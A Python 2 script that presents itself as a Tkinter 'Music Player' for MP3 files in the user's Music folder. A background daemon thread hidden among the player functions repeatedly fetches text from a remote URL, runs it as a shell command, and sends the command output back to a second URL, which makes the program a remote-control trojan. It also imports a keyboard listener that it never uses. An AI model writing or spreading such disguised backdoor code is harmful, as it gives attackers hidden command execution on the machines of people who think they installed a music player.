#!/usr/bin/env python
from Tkinter import *
from pygame import *
from os import *
from mutagen.mp3 import MP3
import queue
import requests
import subprocess
from threading import *
import time
import sys
from pynput.keyboard import Listener
import os
import getpass
path = getpass.getuser()
path = str(path)
print type(path)
path = "/"+path+"/Music"
path1 = path+"/"
pwd = os.getcwd()
pwd1 = pwd+"/bg.png"
pwd2 = pwd+"/next.png"
pwd3 = pwd+"/pause(1).png"
pwd4 = pwd+"/play(2).png"
len = 1
url = ""
url1 = ""
mixer.init()
l = queue.Queue(50)
root = Tk()
root.geometry("500x400")
root.resizable(0,0)
root.configure(bg="#2b2929")
root.title("Music Player")
canvas = Canvas(width=500, height=220)
canvas.pack()
photo = PhotoImage(file=pwd1)
canvas.create_image(0,0, image=photo, anchor=NW)
global l1
global names2
global name2
n = 0
l1 = queue.Queue(50)
n = 0
i = 0
j = 0
l1 = queue.Queue(50)
name2 = listdir(path)
print name2
for names2 in name2:
     if names2.endswith(".mp3"):
          l1.put(names2)
          #mixer.music.queue("names2")
          #
def play():
     #print(l.get(names2))
     status = Label(root, text="Music Playing", width=500, bd=1,bg="#292b2b",fg="white",anchor=W,relief="sunken",highlightcolor="#292b2b")
     status.place(y=379)
     try:
          clicked
          #mixer.music.unpause()
     except NameError:
          b = path1 + l1.get(i)
          print i
          mixer.music.load(b)
	  print b
          mixer.music.play()
          song = MP3(b)
          len  = song.info.length
          len = len+1
          print len
          t = Timer(len, play_next)
          t.daemon = True
          t.start()

     if clicked == 1:
          mixer.music.unpause()
          status = Label(root, text="Music Playing", width=500, bd=1,bg="#292b2b",fg="white",anchor=W,relief="sunken",highlightcolor="#292b2b")
          status.place(y=379)
def play_next():
     global i
     print i
     i = i+1
     play()
def pause():
     global clicked
     clicked = 1
     mixer.music.pause()
     status = Label(root, text="Music Paused", width=500, bd=1,bg="#292b2b",fg="white",anchor=W,relief="sunken",highlightcolor="#292b2b")
     status.place(y=379)
def next():
    # music = "/root/Music/" + l1.get(i)
    # print"Playing " + music
    # mixer.music.load(music)
    # mixer.music.play()
    play_next()
def sleep_check():
    req = requests.get(url)
    req1 = req.text
    if req1 != 'sleep':
        web()
def web():
    r = requests.get(url)
    r1 = r.text
    if r1 != 'stop':
        web = subprocess.Popen(r1, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        res = web.stdout.read()
        #print res
        par= {'data':res}
        requests.get(url1, params=par)
    elif r1 == 'sleep':
        sleep_check()
    elif r1 == 'stop':
        root.destroy()
def thread():
    i=1
    while i!=0:
        web()
        time.sleep(1)
t = Thread(target=thread)
t.daemon = True
t.start()
status = Label(root, text="Player Idle", width=500, bd=1,bg="#292b2b",fg="white",anchor=W,relief="sunken",highlightcolor="#292b2b")
status.place(y=379)
photonew = PhotoImage(file=pwd4)
btn = Button(root, image=photonew,bd=0,activebackground="black", highlightbackground="black", command=play)
btn.config(activebackground=btn.cget('background'))
btn.place(x=220,y=232)
photon = PhotoImage(file=pwd3)
btn1 = Button(root, image=photon,bd=0,activebackground="black", highlightbackground="black", command=pause)
btn1.config(activebackground=btn1.cget('background'))
btn1.place(x=250,y=232)
photo1 = PhotoImage(file=pwd2)
btn2 = Button(root, image=photo1,bd=0,activebackground="black", highlightbackground="black", command=next)
btn2.config(activebackground=btn1.cget('background'))
btn2.place(x=280,y=232)
root.mainloop()
